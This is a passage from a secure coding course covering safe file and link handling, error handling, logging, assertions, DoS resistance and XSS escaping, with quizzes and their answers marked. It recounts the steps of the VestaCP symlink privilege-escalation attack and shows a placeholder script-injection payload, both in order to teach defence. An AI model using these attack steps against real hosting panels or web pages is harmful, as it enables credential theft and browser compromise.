A simple solution is to prefix all globs or filenames where needed with “**./**” so that they cannot begin with “**-**”. So for example, never use “**\*.pdf**” to refer to a set of PDFs if an attacker might influence a directory’s filenames; use “**./\*.pdf**”.

Be careful about displaying or storing pathnames, since they can include newlines, tabs, escape (which can begin terminal controls), or sequences that are not legal strings. On some systems, merely displaying filenames can invoke terminal controls, which can then run commands with the privilege of the one displaying.

#### File Handling (Including Link Following)

Once you have a pathname, you often want to do something with it, such as try to open that file.

As discussed in [“Beware of Race Conditions”](#beware-of-race-conditions), open files in ways that prevent time-of-check time-of-use (TOCTOU) race conditions. Open a file directly instead of querying if the access is permitted (since that may change). Include the “exclusive” option (“<tt>x</tt>” or `O_EXCL`) if you want to expressly require that the file be created. If you’re creating temporary files, use interfaces specifically designed to securely create temporary files.

If your software might open a file system object (including a directory) that an attacker might control, be prepared for it. One way this can happen that we have not yet discussed is improper link resolution.

Most operating systems support “hard links” and “symbolic links”... but many developers don’t know about them or don't account for them. A “hard link” creates another name that refers to the exact same underlying file system object, with the same ownership and permissions. A “symbolic link” (aka “symlink” or “soft link”) is a special file that contains a reference to another file or directory in the form of an absolute or relative path; an attempt to open the symbolic link will be redirected to open the reference instead. These can be very useful. However, if an attacker can create these links in a file system object your application might open, these links can also be a problem and applications must be prepared to deal with them.

You need to write code that is prepared for hard and symbolic links. In particular, do not assume that all files in a directory are necessarily owned by the owner of the directory. If your program has elevated privileges, you may need to temporarily drop those privileges before handling the filesystem. You can also open files using the `O_NOFOLLOW` option on Unix-like systems; this disables following symlinks on the last filename component (the basename), but only on the last component, and in some programming languages it takes extra steps to use the option.

Modern versions of Windows support hard links and symbolic links. However, creating them typically requires elevated privileges (e.g., admin or developer mode) so they are somewhat less likely as an attack method compared to Unix-like systems. These kinds of vulnerabilities still happen on Windows systems because privileged users can create them and some applications aren’t designed to use them correctly, leading to exploitable vulnerabilities.

There are two common measures you can take on Unix-like systems to harden them against many kinds of link-based attacks, although they do not counter all attacks:

1.  All directories that are writable by multiple users should also have the “sticky” bit set. In most modern Unix-like systems, a directory with the “sticky” bit set restricts changes that are allowed in the directory. For example, on Linux systems the sticky bit means for any file in that directory, only the file's owner, the directory's owner, or root user can rename or delete the file. Normally on Unix-like systems insertion and renames of files in a directory can be done by all the users with write permission on the directory, regardless of the file owner. The sticky bit is typically already set for pre-existing shared directories like `/tmp` but you must specially set the sticky bit if you create new directories where writing is shared between users. The sticky bit makes some kinds of attacks harder to perform, including ones based on creating or changing links in that directory.
2.  Where available, enable “protected sticky symlinks” (aka `protected_symlinks`). In systems with protected sticky symlinks, a symbolic link is only followed if it is outside a sticky world-writable directory, or when the uid of the symlink and follower match, or when the directory owner matches the symlink's owner.  Many Linux distributions enable this by default, including Ubuntu, Fedora, and Red Hat Enterprise Linux.

> 😱 STORY TIME: VestaCP Link Following Vulnerability (CVE-2021-30463)

> VestaCP is an open source hosting control panel (enabling users of a hosting service to manage their hosting package, e.g., purchase domain names, install applications, create and manage email accounts, and upload website files).  Unfortunately, VestaCP through version 0.9.8-24 allows attackers to gain privileges by creating symlinks to files for which they lack permissions, a vulnerability identified as [CVE-2021-30463](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-30463).

The fundamental problem is that the VestaCP application presumed that any files under the user home directory (directly or indirectly) were necessarily owned and controlled by the user. But this is not necessarily true in modern operating systems. In the vast majority of modern operating systems, hard and symbolic links enable other files to be referenced from them.

The details of this attack were described as follows ([SSD Disclosure, SSD Advisory – VestaCP LPE Vulnerabilities, March 20, 2021](https://ssd-disclosure.com/ssd-advisory-vestacp-lpe-vulnerabilities/)). An attacker could go to their user web directory inside their home directory and create a directory with the name of the domain they wish to attack (e.g., *pwned.pwn*) that is controlled by the system. Inside that directory, the attacker would create another directory called `public_xhtml`. And inside `public_xhtml` the attacker would create a symlink (e.g., *pwn.pwn*) to the desired file the attacker wanted to read, e.g., the login secret in the admin account’s user.conf file. Also in the directory of the domain, *pwned.pwn*, the attacker would create symlinks to the folders which the attacker doesn’t have permission to access, e.g., `/usr/local/vesta/data/users` and `/usr/local/vesta/data/users/admin`. The attacker can then trigger the vulnerability by creating a domain with the name *pwned.pwn* in the /add/web URL of VestaCP. The attacker can now read the secret contents of the user.conf of admin, allowing the attacker to change the admin password.

🔔 2021 CWE Top 25 #31 is [CWE-59](https://cwe.mitre.org/data/definitions/59.html), Improper Link Resolution Before File Access ('Link Following').

#### Quiz 3.4: Filenames (Including Path Traversal and Link Following)

\>>Select all the statements that are true.<<

\[!] On Unix and Linux, filenames are a sequence of characters. {{ selected: No, in general filenames in Unix and Linux are a sequence of bytes, which may or may not map to any specific characters at all. Some specific implementations and filesystems require filenames to be a sequence of characters, but this is not true as a blanket statement. }}

\[x] On Unix and Linux, filenames may contain control characters.

\[x] On Unix and Linux, filenames with leading “**-**” characters can be a security problem. A simple solution is to prefix globs with “**./**” so that the first character cannot be a “**-**”.

\[x] Path traversal occurs when an attacker can create filenames that traverse outside where they are supposed to, e.g., by embedding “**/../**”. A good way to counter this is to use a limited allowlist that prevents these attacks.

## Calling Other Programs: Other Issues

### Call APIs for Programs and Check What Is Returned

When writing programs, try to call only application programming interfaces (APIs) that are intended for use by programs.

Usually a program can invoke any other program, including those that are really designed only for human interaction. However, it is usually unwise to invoke a program intended for human interaction in the same way a human would. The problem is that programs’ human interfaces are intentionally rich in functionality and are often difficult to completely control. For example, interactive programs often have “escape” codes, which might enable an attacker to perform undesirable functions. Also, interactive programs often try to intuit the “most likely” defaults; this may not be the default you were expecting, and an attacker may find a way to exploit this.

Usually there are parameters to give you safer access to the program’s functionality, or a different API or application that is intended for use by programs; use those instead.

This goes the other way, too. If you are developing an application with an interactive user interface for humans, make sure there is a way for a program to directly access that functionality as well. That will make it much easier to integrate your application into something larger.

Of course, once you receive information, make sure that you check for error conditions (either directly or via raising an exception). If a request with untrusted data fails, your program should not just blithely go on as if it succeeded. Error handling is such an important topic that we will cover that next.

#### Quiz 3.5: Call APIs for Programs and Check What Is Returned

\>>From a program, try to use same API used by humans, as that may be better tested. True or False?<<

( ) True

(x) False

\[Explanation]

This is false. This would make it much harder to write code (and update it later). More importantly, human interfaces often change or make guesses that are inappropriate when trying to automate something.

\[Explanation]

### Handling Errors

Real programs must handle errors. Many production programs are *mostly* error-handling, because there are so many problems that can happen in the real world.

Poor error handling can lead to security vulnerabilities. So let’s discuss common approaches to error handling and how to use them securely. Basically, this involves understanding their strengths and weaknesses, and being cautious about their weaknesses when using them.

> 😱 STORY TIME: Apple **goto fail; goto fail;**

> An example of a security vulnerability caused by bad error handling is [CVE-2014-1266](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1266), commonly called the “*goto fail; goto fail;*” vulnerability. This was a vulnerability in the Apple implementation of the SSL/TLS protocol in many versions of its operating systems. The problem was a second (duplicate) “**goto fail;**” statement in the function **SSLVerifySignedServerKeyExchange**, as follows:

```C
    if ((err = SSLHashSHA1.update(&hashCtx, &signedParams)) != 0)
      goto fail;
    goto fail;
    ... other checks ...
    fail:
      ... buffer frees (cleanups) ...
      return err;
```

> The indentation here is misleading; since there are no curly braces after the **if** statement, the second “**goto fail**” is always executed. In context, that meant that vital signature checking code was skipped, so both bad and good signatures would be accepted. The extraneous “**goto**” caused the function to return 0 (“no error”) when the rest of the checking was skipped; as a result, invalid certificates were quietly accepted as valid. This was a disastrous vulnerability, since it meant that all sorts of invalid certificates would be accepted, completely compromising security. This vulnerability would be easily detected by an automated test suite. ([*The Apple goto fail vulnerability: lessons learned*](https://dwheeler.com/essays/apple-goto-fail.html), by David A. Wheeler, 2020).

#### Return Codes

One of the most common error-handling mechanisms are return codes. A return code is simply a single value that is *either* the return value of a method/function/procedure or a value that indicates an error. For example, “on success returns 0..INT_MAX, on error returns -1” or “on success returns a pointer, on error returns NULL”. In some cases, nothing is being returned (at least as its return value), so the return value is simply whether or not there was an error. Return codes are the usual approach in C, but return codes are used in many programming languages.

Obviously, when you are developing a program, you need to ensure that the return code is not a legitimate value, so that errors and normal values *can* be distinguished.

Return codes work, but they have many problems when maintaining software over time:

*   They require the caller to check every return value for an error to handle it. These are easy to forget, and thus this is a common mistake.

*   Every method may have different semantics (e.g., different values to indicate “error”). They are often **0**, **negative**, **INT_MAX**, **NULL**, or some other special value… but not always.

*   If new types of errors are added, you must often check every caller to ensure they are handled correctly.

*   They lead to functional logic and error handling being mixed together. This often creates more complex code, leading to mistakes and poorer productivity. In particular, such code often fails to deallocate resources if it must do so.

In most programming languages it is often better to use another mechanism (like exception handling) instead when you are creating the interface, because return codes so easily lead to mistakes over time. This is not practical in portable C, since C does not have many other mechanisms (e.g., C does not have a standard exception handling mechanism). So, if you are using C, consider moving the error handling to the end of the function. This separates error-handling from the functional logic and simplifies correct resource deallocation. A good explanation of this approach is in the [Linux kernel coding style guide](https://www.kernel.org/doc/Documentation/process/coding-style.rst).

When you are using an interface that uses return codes, make certain that you check every time there’s a return code if a failure might lead to a vulnerability. For example, about 35 billion Internet of Things (IoT) devices were found in 2021 to have disastrous security vulnerabilities due to inadequate cryptographic random number generation. This is in part because many IoT software developers directly called hardware random number generators (they shouldn’t do that), but even worse, they ignored error return codes from those generators (and they definitely shouldn’t do that). For more details about this example, see [You're Doing IoT RNG](https://labs.bishopfox.com/tech-blog/youre-doing-iot-rng) ([presentation](https://www.youtube.com/watch?v=Zuqw0-jZh9Y)) by Dan Petro and Allan Cecil, a 2021 DEF CON presentation. We’ll discuss cryptographic random number generation in more detail later.

#### Exceptions

Most programming languages have an *exception handling mechanism* (though there are, er, exceptions!). This includes such diverse languages as Java, C#, Python, PHP (5+), Perl, Ruby, Tcl, JavaScript, C++, Ada, Smalltalk, Common Lisp, Scheme (6+), Erlang, and OCaml. In such systems, you can “throw” or “raise” an exception when an error is detected, and you can “catch” or “rescue” an exception to handle it; the stack is repeatedly unwound when an exception is thrown until there is a matching catch. Many languages define regions to catch (e.g., “try”).

If you are implementing the *top* level of a program or framework (e.g., its main event loop), you typically want to catch all exceptions (with perhaps a few, er, exceptions). Log the exception (with some details, except information like passwords that perhaps should be omitted from the log). Ensure that after the request or event has completed, including when an exception has been processed, that all resources have been returned if they should be. Finally, repeat the event loop to process the next event. Logging can aid debugging and intrusion detection. It is fine to tell the requestor that “there was a problem” while not providing many details; that is what the internal log is for.

Otherwise, you generally should be specific about the exceptions you catch, and only catch an exception if you can do something appropriate about it. Attackers will try to trigger exceptions, so make sure that exception handlers are secure.

#### Other Approaches for Error Handling

There are other error-handling approaches.

Some programming languages use type constructors that provide a return value that distinguishes normal values from error values. A good example of this is Haskell’s **Maybe**, which is defined as “**data Maybe a = Nothing | Just a**”. This means that a **Maybe** value must be either **Nothing** or **Just** a value. This approach is like an error return, but, because the type system distinguishes value from errors (non-values), you cannot accidentally ignore errors; you have to extract the value to get a result. Some programming languages also provide constructs to easily do this extraction and otherwise propagate the error, e.g., the [“?” operator in Rust](https://doc.rust-lang.org/book/ch09-02-recoverable-errors-with-result.html) and [optional chaining in Swift](https://docs.swift.org/swift-book/LanguageGuide/OptionalChaining.html). Of course, you could intentionally write code to skip the error value (e.g., **Nothing**); beware of doing so if this could have a security impact.

Some languages allow multi-value returns and use that for error handling. For example, Go’s error conventions do this. Functions can return multiple values, and one of them can be an error value. This avoids the risks of overloading values as compared to traditional return values. However, like return values, there is a risk you will forget to check the separate error return value. For more details, check out [*The Go Blog: Error handling and Go*](https://blog.golang.org/error-handling-and-go) (2011), by Andrew Gerrand.

#### Error Handling Wrap-up

Error-handling is a fact of life, but you need to make sure your error handling (not just your “main” line) is secure. It is easy to forget to detect or handle errors. Where you can, try to use approaches that are more likely to work correctly *even* as the program is changed by others.

#### Quiz 3.6: Handling Errors

\>>Select all the true statement(s).<<

\[!x] A common problem with traditional return codes is that it is easy to forget to check for the error.

\[ ] You should catch all exceptions raised by the methods/functions you call. {{ selected: No, you should only catch an exception if you know what you will do with it. }}

\[x] If an exception is raised all the way to the “top” of a program (e.g., its event loop), you should typically log that exception, and then decide if the program will halt or continue.

### Logging

The best way to deal with attacks is to prevent them from having any effect. Sadly, as we noted earlier, sometimes attackers get through our prevention measures. In those cases, we need to detect the attack and then recover from it. Detection is vital, because we often won’t know to trigger recovery until we detect a problem.

A key mechanism that enables detection is some sort of logging system. The logs can then be monitored, along with other indicators, to detect ongoing attacks. In practice, logs from different applications are often sent to some protected centralized capability to simplify analysis (because all that data will be in one place) and protect log history even when an application is subverted. This course will not specifically cover how to monitor logs to detect successful attacks. Instead, we will focus on how to send information to logs to enable others (programs and humans) to do that detection.

When building an application, you should generally send detailed data to the logs instead of revealing problem details to untrusted users. It is fine to say there is a problem, but don’t say too much; attackers love it when you give them detailed data about their attacks! The logs should generally record important events, including their success or failures. Examples include login successes, login failures, and logouts. Also include anything that might possibly indicate an attack or attempt to work around defenses. Make sure you provide different categories or importance levels so that the amount of logging information can be controlled at runtime.

Since logging is so important, many applications use some sort of logging system implemented by an external library or application. Typically, you should try to reuse existing log systems; that’s less code to write, easier to integrate with other systems, and so on. If you absolutely must implement your own system, you should generally record for each event the date/time (with sub-second accuracy), the source (machine and application), a category, and details about the event.

Once again, logging is a security mechanism that can itself become a security vulnerability. So do have a logging system in a larger application, but implement it in a way that counters those potential vulnerabilities.

Data for logs often includes data from untrusted users, and attackers may intentionally create data to attack the logging system or later systems that process log data. They may try to insert data that will crash or take over the logging system, forge log entries, or create attacks on the log retrieval system. Log forging is a particularly common problem, and you do not want to build a system that lets attackers frame others. To resolve this, you need to ensure that all untrusted data sent to a log will be escaped or sanitized when it is stored. Many logging APIs already do this - make sure it does, and if you have a choice, strongly prefer using APIs that do this for you. If you don’t have a choice, consider implementing a *wrapper* to automatically and safely encode the log data so that the problem is automatically prevented.

Greatly limit who can read the logs; they generally should not be readable by all. However, even doing this is not enough.

As a general rule, don’t include passwords or very sensitive data in logs. Since people may need to review logs later, log data sometimes gets out to more people than you might expect. Sometimes logs are revealed to others, and the recipient may use the logs in unauthorized ways. Beware of including data if it might include passwords or private keys! If you must include possibly-sensitive data, consider logging the data as an encrypted or cryptographically hashed value, so that people who receive the log cannot easily use it in an unauthorized way.

🔔 *Security Logging and Monitoring Failures* is 2021 OWASP Top 10 #9. *Insufficient logging and monitoring* is 2017 OWASP Top 10 #10. *Inclusion of Sensitive Information in Log Files*, [CWE-532](https://cwe.mitre.org/data/definitions/532.html), is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #39 and 2019 CWE Top 25 #35.

#### Quiz 3.7: Logging

\>>Select all the true statement(s).<<

\[!] In general, logged information should also be displayed to the user who triggered it to speed debugging {{ selected: Absolutely not; the logs may contain sensitive or secret information, and users are often not fully trusted. Instead, report to the user what the user needs to know (e.g., “operation did not work”... and put the details in the logs. }}

\[ ] Logging is often unnecessary because it is better to develop a system that is not vulnerable in the first place. {{ selected: It is great to develop a system without vulnerabilities. Since there is no way to be absolutely certain that is true, we need logging to enable detection of a problem, so that we can then respond to the issue. }}

\[x] Logs should generally include much more detail, but beware of including passwords and private keys, since logs are sometimes visible to many others. If you must include this data, consider including it as an encrypted or cryptographically-hashed value.

\[x] Your log system may need to record data from an attacker, so make sure your logging system is not vulnerable to a “log forging” attack (where an attacker provides data that causes the recorded log to be misleading in some way).

### Debug and Assertion Code

Sometimes vulnerabilities stem from debug and assertion code; let’s talk about that.

#### Debug Code

Developers often insert code solely to gain visibility of what is going on. For example, when debugging, they may insert print statements. They may also do it to simplify testing or simply to gain understanding. By itself, that is fine, but there is a risk of leaving this debug code enabled in production. These are much more likely to lead to defects and security vulnerabilities, since they were not intended to be there in the released software.

So if you insert debug code, segregate it somehow so it is *easy* to automatically remove. It doesn’t matter how; naming conventions, compiler flags, and so on, can all work, as long as it is easy to do the *right* thing.

A good long-term strategy is to have a logging system enabled early, and either use that or transform your debug statements into logging statements. If you find it useful to see information now, it might be useful to see that later. That also means that instead of needing to remove the debug code, you can easily enable it later, even within a production system. This logging code must resist attack, just like the rest of the code.

#### Assertions

Many languages have “assert” statements or expressions to state something that is *supposed* to always be true at runtime. These can be useful for sanity checking of a program while it runs. Examples include Java’s **assert** statement, Python’s **assert** statement, C/C++/Rust’s **assert()** macro, and JavaScript Node.js’s **assert()** method. In most languages, if the assertion fails at runtime, then an exception is thrown.

Assertions are often great, because they can stop problems before they get more serious. However, if an attacker can cause an assertion to fail, that may lead to application exit or other behavior more severe than necessary. In particular, where practical:

*   Avoid allowing an attacker to trigger an assertion. In particular, *never* use assertions for input validation of untrusted input. There are at least two good reasons:

    1.  Countering attacker input is *expected* behavior!

    2.  Assertions can often be disabled with compiler or runtime flags. This violates the principle of having non-bypassable input validation for security, because a perfectly reasonable optimization approach can accidentally disable a vital security need.

*   Limit scope of the assertion response (exception handler) to the attacker’s session where you can. For example, try to crash just that connection, not all connections, if an assertion fails.

🔔 A *Reachable Assertion* (an assertion an attacker can trigger), [CWE-617](https://cwe.mitre.org/data/definitions/617.html), is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #40.

Inserting assertions can make a verification technique called “fuzzing” more effective. So, it is often a good idea to have many assertions, as long as they are expressions that absolutely *should* always be true. We will discuss fuzzing in more detail later.

#### Quiz 3.8: Debug and Assertion Code

\>>Select all the true statement(s).<<

\[!x] If you insert debug code, make it easy to automatically remove or turn it into a logging statement.

\[ ] Use an assertion to determine if an untrusted input meets the input criteria.

\[x] Assertions can make other verification techniques more effective.

### Countering Denial-of-Service (DoS) Attacks

Secure systems should be available to authorized users even while under attack. This is especially difficult if your system can be accessed via the public internet. Attackers may be able to launch a distributed DoS (DDoS) attack from many systems they control, creating millions or billions of requests. If an attacker has many resources, you may not be able to counter the attack *except* by using significant resources (including money) to handle the workload.

One approach is to design your system to be able to handle larger amounts of traffic. That way, attacker requests will simply be handled. Design your system to be scalable (e.g., through containerization) and deploy on a cloud system where you can automatically (or at least rapidly) scale up to much larger sizes if there is demand. Use caches, Content Delivery Networks (CDNs), and minimize execution time per request so that more requests can be handled each second. Consider using a static site where this kind of website is a viable option. There are many ways to minimize execution time (aka increase performance); for many systems, maximal use of database indexes and eliminating so-called “N+1” queries is a good first step.

However, at some point an attacker who controls enough resources will be able to overwhelm most services unless you are willing to spend a large amount of money to handle them. So another approach is to rapidly recover from excessive attacker-caused demand. Make sure your restart can be automated and that your system can restart relatively quickly. Where it is sensible, have a “backoff” mode (e.g., a read-only mode or separate service) so that *some* services are available during an aggressive attack.

Another way to make DoS attacks more difficult is to reduce the amount of resources your application requires. If resources are temporarily required (e.g., file handles, etc.), make sure their allocation and consumption is controlled and that they are returned when no longer needed. In addition, avoid “losing” resources. Memory is a resource automatically managed by many languages, but many other resources are not or are easily lost. If you have to manually return a resource in a language with exception handling, ensure that the resources are returned *even* when an exception is thrown.

🔔 There are several kinds of (related) resource handling vulnerabilities, and any of them can eventually lead to a denial of service. What is more, they are common problems:

*   *Uncontrolled Resource Consumption* ([CWE-400](https://cwe.mitre.org/data/definitions/400.html)) is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #27 and 2019 CWE Top 25 #20.

*   This is highly related to having a missing release of resources, 2019 CWE Top 25 #21, [CWE-772](https://cwe.mitre.org/data/definitions/772.html), *Missing Release of Resource after Effective Lifetime*.

*   *Allocation of Resources Without Limits or Throttling* ([CWE-770](https://cwe.mitre.org/data/definitions/770.html)) is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #40 and 2019 CWE Top 25 #39.

An obvious but surprisingly common problem is loops where an attacker can cause the exit condition to never occur, causing the program to get stuck in an infinite loop without getting work done.

🔔 Loops with unreachable exit conditions are 2019 CWE Top 25 #26, [CWE-835](https://cwe.mitre.org/data/definitions/835.html).

Make sure that you have backups of important datasets and a workable recovery process. That way, if an attacker manages to shut down the whole system, the data loss will be minimized. If necessary, you could even restart the service somewhere else or in some other form using the backups. You should have multiple backups, and at least some older ones should be in *cold storage* (that is, the backups cannot be modified by a later computer attack). That way, if newer backups are corrupted by an attacker (such as by using a ransomware attack), there are backups that can still be used.

#### Quiz 3.9: Countering Denial-of-Service (DoS) Attacks

\>>Select all the approaches that might help counter denial-of-service (DoS) attacks if your service is accessible on the public internet:<<

\[!x] Minimize execution time per request.

\[x] Use a content delivery network (CDN).

\[x] Prevent the loss of the resources required by the system.

\[x] Reduce the time required to restart the system.

\[ ] None of the above

# Sending Output

This chapter describes how to send output securely, including how to counter cross-site scripting (XSS) attacks, using HTTP hardening headers, and securely using formatting systems.

Learning objectives:

1.  Discuss how to securely send output.

2.  Explain how to counter Cross-Site Scripting (XSS) attacks.

3.  Use HTTP hardening headers, including Content Security Policy (CSP).

4.  Explain how to prevent other common output-related vulnerabilities in web applications.

5.  Understand how to securely use format strings and templates.

6.  Understand how to address other common output-related vulnerabilities.

### Introduction to Sending Output

Eventually, programs need to send output somewhere. It could be a reply to a request, a display to a user, storing information in a database, or anything else that returns a result.

Everything we learned about sending information to other programs also applies here. For example, you will often need to be sanitizing, escaping, and/or normalizing the output you send back to some user.

A quick rule-of-thumb is that you should try to minimize the information your program shows to an untrusted user, especially if it is security-related:

*   If your program requires some sort of user authentication (such as many with a network connection), give the user as little information as possible before they authenticate. In particular, avoid giving away the version number of your program before authentication, unless this is easy to find anyway or it is the only instance of the program. Otherwise, if a particular version of your program is found to have a vulnerability, then users who don’t upgrade from that version advertise to attackers that they are vulnerable.

*   If a login fails, note that it failed, but in general don’t say why. For example, don’t say that the username is wrong, unless the attacker can get usernames anyway as public information. Never say a password is “almost” correct; it is correct or it is not.

*   Don’t show passwords on the screen by default. For example, in HTML, use the “password” data type, because that normally replaces each password character with a dot. Otherwise, an attacker shoulder-surfing behind the user could get this information, or the information might accidentally be revealed by a user making a video.

*   If you must display some sensitive information in a form, make that a separate page or have a button that can hide/reveal that information. Try to make hiding the sensitive information the default. Again, this helps counter shoulder-surfing and accidental revelation of information.

*   Minimize inline code comments sent to users; this wastes network traffic and might accidentally reveal information. If you are using JavaScript, minification can help prevent this.

Your program should also be prepared to handle attackers who intentionally reject or very slowly accept the output. Otherwise, an attacker might be able to make your program unresponsive to other users, simply by clogging some output. Implementations that use asynchronous communications are usually much less vulnerable to this, but any implementation *can* have this problem. Basically, make sure an attacker cannot clog a system by halting or slowing their web browser, having an intentionally slow TCP/IP connection, and so on. In short, don’t create an easy opportunity for a Denial-of-Service attack. Here are some tips:

*   Release locks quickly, preferably before replying with *any* output.

*   Use timeouts on network-oriented writes.

*   Measure the time from the start of your attempt – it is ok to halt in the middle if it is suspiciously slow.

You should follow the standing conventions of the system you are using where possible, since often other components depend on that. In particular, on the web, the **GET** and **HEAD** methods of HTTP should not take any permanent action by themselves; they should be just retrieving information. The **GET** method, in particular, can be caused by a simple click on a hyperlink in a static page, and should not involve anything permanent like buying or selling. Instead, use other methods (like **POST**, **PUT**, and **DELETE**) to indicate permanent changes. The HTTP protocol can’t enforce this, but it is the standard convention, and many tools assume it, so you should also apply this rule where practical.

Make sure that you tell the receiver exactly how to interpret the output. Otherwise, if it includes data from an attacker, the attacker might be able to fool the recipient into interpreting it the wrong way. This is an especially common problem in web applications:

*   Clearly state the MIME type of the data that is being sent. Browsers can guess, but they may guess wrong.

*   Clearly state the character encoding of the output that is being sent. Don’t make the receiving program guess the character encoding! If the receiving program (typically the web browser) has to guess, the attacker may fool your system into sending material that leads to a wrong guess and eventually an attack. If you are sending HTML, usually you should tell the recipient that it is UTF-8. The best way to do that is via the HTTP **charset** option, which you can often do with a simple configuration option. If you cannot control that for some reason, include that information in the HTML **\<head>**, e.g., **\<meta http-equiv="Content-Type” content="text/html; charset=UTF-8">**.

More generally, you often need to ***escape your output*** so that any data you generate that might be influenced by an attacker cannot become an attack. This is an especially common problem in web applications. One of the most common vulnerabilities in web applications is called *Cross-Site Scripting* (XSS). This problem is all about not sending output properly and, in particular, about escaping output correctly. The next unit will explain the vulnerability and how to deal with it.

#### Quiz 4.1: Introduction to Sending Output

\>>Do not waste space telling a receiving web browser the data type or encoding being sent, as browsers do an excellent job at automatically determining this information. True or False?<<

( ) True

(x) False

\[Explanation]

This is false. Web browsers do an excellent job at automatically determining this information when there is no attack, but attackers can be very crafty at supplying data specifically designed to fool receiving programs’ heuristics. Instead, where options exist, you should send information to recipients to tell them exactly how to interpret the data, such as its data type and encoding.

\[Explanation]

### Countering Cross-Site Scripting (XSS)

\[Web application]

#### The XSS Problem

One of the most common vulnerabilities in web applications is a Cross-Site Scripting (XSS) vulnerability. In an XSS attack, the attacker tries to fool a web browser to do something malicious (usually to run malicious code) by inserting information into a valid web page or web application that will be misinterpreted by the receiving browser as some sort of malicious action. It is always abbreviated as XSS, because CSS already has another meaning (Cascading Style Sheets). XSS is an especially common problem in pages or sites that allow user comments, because user comments are an easy vector for attackers to insert their malicious information.

The fundamental problem is that web browsers (which operate as clients) must presume that if they were sent some data, the sender intended to send it. After all, what else could the web browser presume? However, if the sender creates that data by combining constant data it controls with attacker-provided data, and the attacker-provided data is not properly sanitized, then the combination could become malicious. The mishmash of this combination would then be interpreted by the web browser as a request to do something malicious, which it then dutifully does.

For example, if the web server sends HTML embedded with a string from an untrusted user, and an attacker arranges for that string to contain **\<script> do_something_malicious(); </script>**, the user might end up running the JavaScript program **do_something_malicious()**.

In XSS, the system that is eventually attacked is the *web browser*. However, the *cause* of the attack is improper code written in the *sender* of the data to the web browser. There are three common patterns for XSS:

*   **Persistent Store**<br>The malicious data is stored in a database for later retrieval. For example, an attacker submits a comment with an embedded malicious script; when someone else uses their web browser to view the comments, the web browser runs the malicious script.

*   **Reflection**<br>The malicious data is sent by the victim’s web browser to the server (typically inside a URL) and immediately reflected back to the browser.

*   **DOM-based**<br>The web client sends the attack data to itself, typically using data provided from an attack and then sent via the DOM using JavaScript.

🔔 XSS is such a common mistake in web applications that it is 2017 OWASP Top 10 #7. XSS is considered part of 2021 OWASP Top 10 #3 (Injection) in its 2021 edition. It is also 2019 CWE Top 25 #2 and 2021 CWE Top 25 #2. In CWE it is [CWE-79](https://cwe.mitre.org/data/definitions/79.html), *Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)*.

#### The XSS Solution: Escape Output

The standard way to counter XSS is to escape all output that might be from an attacker and is not specifically approved. In many ways, this is the best countermeasure. Done right, it completely counters the attack and is very flexible. For example, if you have untrusted HTML data from an attacker, apply the standard HTML escapes unless you have a good reason to do otherwise:

**Standard HTML Escapes**

<table>
  <tr>
    <td>Original</td>
    <td>Escaped HTML</td>
  </tr>
  <tr>
    <td>&amp;</td>
    <td>&amp;amp;</td>
  </tr>
  <tr>
    <td>&lt;</td>
    <td>&amp;lt;</td>
  </tr>
  <tr>
    <td>&gt;</td>
    <td>&amp;gt;</td>
  </tr>
  <tr>
    <td>"</td>
    <td>&amp;quot;</td>
  </tr>
  <tr>
    <td>‘</td>
    <td>&amp;#39; or &amp;apos;</td>
  </tr>
</table>

In output sanitizing, just like input validation, it is often best to identify an allowlist and escape the rest. However, sometimes required output escapes are a well-defined list that you can directly apply, because sometimes you *can* safely enumerate the categories as we have done here for HTML. There are technically cases where you don’t have to apply the escapes to untrusted data, but in HTML it is often simpler and faster to just automatically apply them all unless you have a specific need to permit something else. Of course, these are only the escapes for HTML itself; these are not enough by themselves for other data formats (such as embedded URLs and HTTP headers).

Here is the problem: You have to be *perfect*. If you escape output correctly 99.9% of the time, and you generate output in 1,000 places, your program is *vulnerable*. You may be a genius, but that is not relevant; even geniuses make mistakes. Even if the software was *originally* perfect, a later change can easily introduce a vulnerability. We need a better solution than “*never make a mistake that is easy to make*” - especially when something happens over and over again.

In most cases, the best solution for XSS is to ***choose a framework or library that automatically escapes HTML output for you***. That way, the output escaping is done, but you don’t have to constantly think about it. Instead, the output system automatically escapes the output for you (this is sometimes called *auto escaping*). This escaping is typically done using one of the many templating systems available that let you specify the constant template (which is trusted and therefore goes through unescaped) and the data (where untrusted data is escaped by default).

There are lots of options that do this. The JavaScript library React, for example, escapes by default any values embedded in its JSX language before rendering it. Ruby on Rails escapes HTML values by default when using its ERB templates. The Python web framework Flask uses the Jinja template library to render templates, and Jinja autoescapes data rendered in an HTML template. This is absolutely not a complete list; auto escaping is a very common capability in web frameworks. We strongly recommend that you only choose web frameworks and output libraries that will escape HTML by default; there are many good ones to choose from.

#### When You Need to Allow Unescaped Untrusted Data

Occasionally you *do* need to allow unescaped data through. One reason you might *want* to omit some escapes is that you want untrusted data to have some action that escaping would prevent. For example, let’s say that you want untrusted users to provide HTML that will italicize some of their text. In that case, you will want to let **\<i>** and **\</i>** (italics) through, even though you would normally escape the **<** and **>** characters.

The problem is that once you allow anything additional through, the code necessary to properly escape output is much more complicated. For example, you need to make sure that every opening tag (**\<i>**) has a matching tag, that they nest properly, that they either don’t have attributes or those attributes are themselves allowed, and that only the tags and attributes that you allow are let through. There are many cases where this becomes a vulnerability. After all, many frameworks escape data by default, but when developers need to let something through, they sometimes allow *too much* through.

In that case, where possible, use libraries *already designed* to allow only what you want, and escape everything else. Most widely-used programming languages and frameworks already have libraries that let you state what to let through, and then escape, strip, or forbid the rest.

#### URLs

We have focused on escaping HTML, because that is the biggest problem in web applications. But HTML can embed other kinds of data, and of those, perhaps the most common are URLs.

